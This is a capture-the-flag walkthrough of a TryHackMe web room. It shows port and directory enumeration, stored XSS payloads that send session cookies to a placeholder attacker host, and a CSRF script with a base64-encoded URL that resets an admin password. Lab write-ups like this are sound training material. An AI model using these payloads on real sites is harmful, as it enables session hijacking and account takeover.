---                                                                                                                   
  title: "TryHackme -- Include"          
  description: "A walkthrough for “
  Include” room on #TryHackMe -- https://tryhackme.com/room/include"                                               
  date: "2025-10-19"                                        
  headerImage: "https://github.com/user-attachments/assets/79f30734-8acc-4256-a7a3-731092b42eae"                                                                             
---   

<img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/79f30734-8acc-4256-a7a3-731092b42eae" />

## Setup
- Start the target VM
- Add the IP address to the host file `echo "$IP worldwap.thm" >> /etc/hosts`

## Enumeration
- Scan for open ports: `nmap -T4 -p- -sC -sV worldwap.thm -Pn -n`
  
![](src="https://github.com/user-attachments/assets/e0edc13a-3f62-458e-a6e9-1c7ba01bd7f0")

-> 3 ports were open — 22, 80, 8081.

<img width="975" height="565" alt="image" src="https://github.com/user-attachments/assets/d5c70089-d4c4-43dc-9503-189600a3c226" />

- Enumerate directories on port 80

```bash
gobuster dir -u 'http://worldwap.thm' -w /usr/share/wordlists/dirb/big.txt -x .php,.txt,.jsp,.json,.js -b 403-500
```

<img width="975" height="473" alt="image" src="https://github.com/user-attachments/assets/42cc7673-d96b-414c-87f5-27e20d34cc24" />

- Fuzz hidden directories and files on port 8081.
  
<img width="975" height="503" alt="image" src="https://github.com/user-attachments/assets/8a132af6-8927-4915-becc-06c2ccb85f5d" />

- The website has a login page:

Press enter or click to view image in full size

The website forwards me to login.worldwap.thm. Here, I also tried to fuzz directories and files:

Press enter or click to view image in full size

Lastly, I fuzzed hidden directories and files on port 8081.

Press enter or click to view image in full size

2. Moderator access via XSS:
The website has a register page, so I gave a shot.

<img width="975" height="473" alt="image" src="https://github.com/user-attachments/assets/ebb7cdd1-9b96-4249-b1e2-e49ee54ffbc5" />

<img width="975" height="386" alt="image" src="https://github.com/user-attachments/assets/c010bda5-aaff-4c64-a7c0-8b4066511106" />

<img width="975" height="453" alt="image" src="https://github.com/user-attachments/assets/2ec477f7-d405-4457-ae53-49525812c938" />


But returned the following error. Page said that I have to visit the domain named login.worldwap.thm.

Press enter or click to view image in full size

Press enter or click to view image in full size

The same error returned by the website.

At this point, I tried everything, checked page sources, registered several times, searched for valid credentials. But I was missing a hint, the creator left a message for me on the register page.

Press enter or click to view image in full size

The message said, “Your details will be reviewed by the site moderator.”. It means, I have 2 options:

1. I have to find a way to make the moderator review the account that I registered.

2. I have to find a way to get access as a moderator.

Unfortunately, the first one wasn’t a good idea, because I didn’t know how the review flow was working on the website. I have to follow the first option.

To gain access as a moderator, I decided to steal the moderator’s cookie, why? Because when I checked the cookie of my current session, I saw the value of the HttpOnly flag is false. This means, it was possible to steal the moderator’s cookie via XSS, if inputs in the register page was vulnerable.

Press enter or click to view image in full size

For getting moderator’s cookie, I used script tag with window.location method.

PAYLOAD: <script>window.location=’http://ATTACKER_IP:PORT/?’+document.cookie;</script>

Or you can use img iframe HTML tags with event handlers like onerror, onbeforescriptexecute, etc.

I tried with both img and script tags.

First, started listener on port 4444, where the website have to send the GET request with cookie.


Adding the payload in Email input:

Press enter or click to view image in full size

Press enter or click to view image in full size

And I got the cookie.

Another example with img tag:


Added the payload to the name input:

<img src=x onerror=”window.location=’http://ATTACKER_IP:PORT/?’+document.cookie;” />

Press enter or click to view image in full size

Press enter or click to view image in full size

Again, I got the result.

On this page, username and password inputs weren’t worked for me because of input size limitations.

After getting the cookie, I went to the login.worldwap.thm page, because of the message on the register page.

Press enter or click to view image in full size

After swapping the cookie, I refreshed the page.

Press enter or click to view image in full size

And here was the moderator profile, also I got the answer of the room’s first question.

3. Getting admin bot’s cookie
After getting access to the moderator account, I surfed between the tabs to find out a way to log in as an admin.

Actually, it has 2 ways:

3.1. Changing admin’s password via CSRF
Press enter or click to view image in full size

On the chat page, I found a vulnerable Stored XSS input.

Press enter or click to view image in full size

Again, I thought it was possible to get the admin’s token, but it didn’t work for me.

Press enter or click to view image in full size

Press enter or click to view image in full size

Again, I checked the pages and found changepassword feature.

Press enter or click to view image in full size

I tried to change the password, but the website gave me a message that it was only available for admin.

After some time, I remembered a section from the CSRFv2 room. It was talking about getting access as a victim by making a victim change its password via CSRF.

CSRF
Learn how a CSRF vulnerability works and methods to exploit and defend against CSRF vulnerabilities.
tryhackme.com

I copied the payload and made some modifications.

<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', atob('aHR0cDovL2xvZ2luLndvcmxkd2FwLnRobS9jaGFuZ2VfcGFzc3dvcmQucGhw'), true);
xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.onreadystatechange = function () {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
alert("Action executed!");
}
};
xhr.send('action=execute&new_password=admin123');
</script>
Basically, this script made a POST request to the base64 encoded URL I added below and adds admin123 to the new_password input. If the response was 200 OK, then alert will be displayed in the page.

http://login.worldwap.thm/change_password.php

Then, I pasted it to the chat message bar, and fortunately, it worked.

Press enter or click to view image in full size

Press enter or click to view image in full size

Password was changed, and it was time to log in as an admin.

Press enter or click to view image in full size

Press enter or click to view image in full size

Here I got access as an admin, and the answer of the second question of the room.

3.2. Read admin.py under login.worldwap.thm
Because of the chatbot I found on the login.worldwap.thm, I thought maybe fuzzing with py extension could be a great way to find out how chat page was working.

Press enter or click to view image in full size

Of course, I got admin.py and test.py. I read both and found hardcoded credentials.

Press enter or click to view image in full size

Press enter or click to view image in full size

Press enter or click to view image in full size

